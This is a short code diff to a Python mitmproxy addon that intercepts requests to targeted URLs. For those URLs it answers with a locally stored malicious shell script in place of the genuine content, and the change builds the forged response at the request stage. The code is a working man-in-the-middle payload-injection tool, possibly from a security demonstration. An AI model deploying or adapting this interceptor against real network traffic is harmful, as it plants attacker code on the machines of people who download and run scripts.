@@ -6,14 +6,20 @@
 
 import os
 
+from mitmproxy import http
+
 MALICIOUS_SCRIPT_PATH = os.getenv('MALICIOUS_SCRIPT', 'mitm/malicious.sh')
 
 with open(MALICIOUS_SCRIPT_PATH, 'r') as f:
   MALICIOUS_SCRIPT = f.read().encode('utf8')
 
-def response(flow):
+def request(flow):
   if is_target_url(flow.request.pretty_url):
-    flow.response.content = MALICIOUS_SCRIPT
+    flow.response = http.HTTPResponse.make(
+      200,
+      MALICIOUS_SCRIPT,
+      {"Content-Type": "text/plain"}
+      )
 
 def is_target_url(url):
   '''Check if the url is a target.'''
